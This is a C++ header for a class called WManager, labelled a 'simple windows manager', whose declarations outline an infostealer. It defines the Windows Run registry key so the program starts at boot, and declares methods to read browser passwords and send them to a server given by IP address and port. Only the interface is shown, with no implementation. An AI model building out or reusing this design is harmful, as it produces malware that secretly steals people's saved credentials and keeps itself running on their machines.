
/***
	SIMPLE WINDOWS MANAGER
							***/

#ifndef		_WMANAGER_HH_
# define	_WMANAGER_HH_

# define	_REGISTER_KEY_PATH		L"SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run"
# define	_TEMPO_SEND_KEY			0	/// seconds

#include "IManager.hh"
#include <Windows.h>
#include <wincrypt.h>

class WManager : public IManager
{
public:
	WManager(const char *exePath);
	~WManager();

	void			launchApp();
	const int		connectToServer(const char *ipSrv, const uint16_t port);

private:
	// Methods
	void			runAtBoot();
	void			getBrowserPassword(const std::string &userName);
	void			sendBrowserPassword(const std::vector<BrowserPassword::t_loginConnection> &passwords, const std::string &userName);
	void			initDatabase();

	// Attributes
	std::string		_exePath;
};

#endif		/* !_WMANAGER_HH_ */